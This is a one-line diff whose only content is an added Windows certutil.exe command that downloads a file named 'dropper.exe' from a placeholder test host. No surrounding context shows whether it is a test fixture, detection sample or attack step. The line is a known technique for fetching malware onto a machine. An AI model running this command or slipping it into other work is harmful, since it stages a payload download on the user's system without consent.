@@ -1,0 +1,1 @@
+certutil.exe -urlcache -f http://df3-example.test/dropper.exe dropper.exe
